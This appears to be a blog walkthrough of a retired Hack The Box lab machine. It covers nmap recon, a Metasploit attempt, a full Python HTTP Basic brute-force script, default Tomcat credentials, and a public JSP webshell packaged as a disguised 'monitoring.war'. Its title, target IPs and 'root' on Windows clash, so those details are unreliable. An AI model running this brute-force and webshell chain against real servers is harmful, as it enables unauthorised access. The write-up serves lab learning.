---
layout: post
title: HTB Optimum Walkthrough
categories: security
---

## Summary

It continues to be catchups time for me, as I write up retired HTB boxes that I did a while back. This time round, it's Optimum; an easy Windows box by `ch4p`.

## External Reconnaisance

### NMap Port Scan

As we always do with HTB boxes, we will begin with some NMap reconnaisance. We first conduct a scan against the top 1000 ports, with scripts enabled:

`sudo nmap -v -sC -sS -oX nmap-10-10-10-7-scripted.xml 10.10.10.7`,

and follow that up with a non-script scan of all 65535 ports:

`nmap -v -p- -oX nmap-10-10-10-7-full.xml 10.10.10.7`

We find the following ports are open:

| port      | state | service          |
| --------- | ----- | ---------------- |
| 8080/tcp  | open  |    http-proxy    |

The script scan grabs the banner info from the server, showing that it is running version 7.0.88 of Apache Tomcat.

### Web Reconnaisance

Navigating to `10.10.10.95:8080` in our browser shows us a default-looking Tomcat welcome screen. This is interesting, since it indicates that the site is incomplete, and may have been put up in a rush. If the devs didn't bother to change the landing page, what else did they not bother to change?

[<img src="{{ site.baseurl }}/images/security/jerry/tomcat-welcome.png" alt="Tomcat default welcome screen" style="width: 400px;"/>]({{ site.baseurl }}/images/security/jerry/tomcat-welcome.png)

Trying to navigate away to the server status page, the manager app, or the host manager, pops up an HTTP Basic authentication prompt. Not much else we can do from here.

[<img src="{{ site.baseurl }}/images/security/jerry/tomcat-auth.png" alt="Tomcat authentication prompt" style="width: 400px;"/>]({{ site.baseurl }}/images/security/jerry/tomcat-auth.png)

A quick search online for CVEs against this version of Tomcat reveals `https://www.cvedetails.com/cve/CVE-2019-0232/`: an RCE *with* a Metasploit module!

## Exploitation

So let's try to exploit this vulnerability. We boot up Metasploit, choose the appropriate exploit module

`use exploit/windows/http/tomcat_cgi_cmdlineargs`,

set the target

`set rhosts 10.10.10.95`,

and `run` the exploit...

And it's not exploitable. Darn. 

Not seeing any other immediate options, let's see if we can brute-force the HTTP Basic login. This isn't as much of a shot in the dark as you may think; we already know that the site has not been configured particularly well (see above), so maybe they've kept a default password.

We can quickly put together a python script which can run through a list of credentials, and try each in turn against an HTTP Basic authentication endpoint:

```python
import requests
import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Does a basic bruteforce, using HTTP Basic Authentication, against a web endpoint.")
    parser.add_argument("credslist", type=str, help="A list of credentials, one set per line, in format [username]:[password]")
    parser.add_argument("target", type=str, help="The target URL to authenticate against")

    args = parser.parse_args()
    success = False

    with open(args.credslist) as f:
        for line in f:
            creds = line.strip("\n").split(":")
            response = requests.get(args.target, auth=(creds[0], creds[1]))

            if response.status_code == 200:
                print("[+] Valid credentials: {}:{}".format(creds[0], creds[1]))
                success = True
                break

    if success != True:
        print("[-] No valid credentials found.")
```

We then run this by: `python3 http-basic-auth-bruteforce.py /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html`. Leaving it a short time returns us the credentials: `tomcat:s3cret`. Very secure(!)

Using these credentials, we log in to the Web Application Manager interface. This interface allows us to upload WAR files to be run on the server. Juicy.

[<img src="{{ site.baseurl }}/images/security/jerry/tomcat-app-man.png" alt="Tomcat Web App Manager" style="width: 400px;"/>]({{ site.baseurl }}/images/security/jerry/tomcat-app-man.png)

Quickly hopping over to Github to grab a JSP webshell (I plan to code up one of my own at some point, but hey ho): `https://github.com/tennc/webshell/blob/master/jsp/jspbrowser/Browser.jsp`. We then compile this: `jar -cvf monitoring.war index.jsp`; we choose the name so as to fly under the radar a little.

Uploading this gives us access to the filesystem, from where we can apparently view files owned by `root`, because I guess they're running Tomcat as `root`. No privesc needed!

## Conclusion

Hope you enjoyed this walkthrough and the box; quite a fun little easy box. Stay tuned for more walkthroughs, as I start to catch up with the backlog of boxes I want to write up.

As always, you can head to my GitHub to see [a bit of a more "professional report"-style writeup](https://github.com/cybersecmoo/writeups/blob/jerry/htb/boxes/jerry.md), if that's your bag.

Thanks for reading!

